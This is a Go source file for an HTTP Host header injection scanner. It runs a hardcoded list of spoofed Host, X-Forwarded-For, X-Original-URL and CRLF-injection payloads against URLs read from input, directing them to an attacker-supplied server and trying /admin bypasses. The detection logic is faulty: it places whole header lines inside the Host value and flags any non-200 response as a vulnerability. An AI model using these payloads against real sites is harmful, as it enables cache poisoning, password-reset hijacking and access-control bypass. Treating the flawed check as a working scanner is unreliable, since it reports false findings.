package main

import (
	"fmt"
	"os"
	"strings"
	"net/http"
	"flag"
	"bufio"
)

var ATTACK_TECHNIQUES = []string{
	"Host: {{attacker}}",
	"Host: {{target}}.{{attacker}}",
	"Host: {{attacker}}.{{target}}",
	"Host: {{target}} Host: {{attacker}}",
	"Host: {{attacker}} Host: {{target}}",
	"Host: {{target}} X-Forwarded-Host: {{attacker}}",
	"Host: {{target}}%0d%0aX-Forwarded-For: {{attacker}}",
	"Host: {{target}} Referer: {{attacker}}",
	"Client-IP: {{attacker}}",
	"Forwarded-For-Ip: {{attacker}}",
	"Forwarded-For: {{attacker}}",
	"Forwarded-For: localhost",
	"Forwarded: {{attacker}}",
	"Forwarded: localhost",
	"True-Client-IP: {{attacker}}",
	"X-Client-IP: {{attacker}}",
	"X-Custom-IP-Authorization: {{attacker}}",
	"X-Forward-For: {{attacker}}",
	"X-Forward: {{attacker}}",
	"X-Forward: localhost",
	"X-Forwarded-By: {{attacker}}",
	"X-Forwarded-By: localhost",
	"X-Forwarded-For-Original: {{attacker}}",
	"X-Forwarded-For-Original: localhost",
	"X-Forwarded-For: {{attacker}}",
	"X-Forwarded-For: localhost",
	"X-Forwarded-Server: {{attacker}}",
	"X-Forwarded-Server: localhost",
	"X-Forwarded: {{attacker}}",
	"X-Forwarded: localhost",
	"X-Forwared-Host: {{attacker}}",
	"X-Forwared-Host: localhost",
	"X-Host: {{attacker}}",
	"X-Host: localhost",
	"X-HTTP-Host-Override: {{attacker}}",
	"X-Originating-IP: {{attacker}}",
	"X-Real-IP: {{attacker}}",
	"X-Remote-Addr: {{attacker}}",
	"X-Remote-Addr: localhost",
	"X-Remote-IP: {{attacker}}",
	"X-Original-URL: /admin",
	"X-Override-URL: /admin",
	"X-Rewrite-URL: /admin",
	"Referer: /admin",
	"GET {{target}} HTTP/1.1\r\nHost: {{attacker}}",
	"GET /index.php HTTP/1.1\r\nHost: {{target}}\r\nHost: {{attacker}}",
}

func performHHIAttack(technique, server, url, httpMethod string) {
	technique = strings.ReplaceAll(technique, "{{attacker}}", server)
	technique = strings.ReplaceAll(technique, "{{target}}", url)

	client := &http.Client{}
	req, err := http.NewRequest(httpMethod, url, nil)
	if err != nil {
		fmt.Printf("[-] Error creating request for %s: %s\n", url, err)
		return
	}

	req.Header.Set("Host", technique)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[-] Error requesting %s: %s\n", url, err)
		return
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("[-] HHI vulnerability for technique '%s' at %s, Status Code: %d\n", technique, url, resp.StatusCode)
	}
}


func printBanner() {
	banner := `
   __ ____ ______
  / // / // /  _/
 / _  / _  // /  
/_//_/_//_/___/  
                 
	adrianalvird [ 1.0.0 ]
`
	fmt.Println(banner)
}


func main() {
	serverPtr := flag.String("s", "", "Server URL (e.g., mysite.com)")
	methodPtr := flag.String("m", "POST", "HTTP method (default: POST)")

	flag.Parse()
	printBanner()

	server := *serverPtr
	httpMethod := *methodPtr

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		url := scanner.Text()
		for _, technique := range ATTACK_TECHNIQUES {
			performHHIAttack(technique, server, url, httpMethod)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("[-] Error reading standard input: %s\n", err)
	}
}

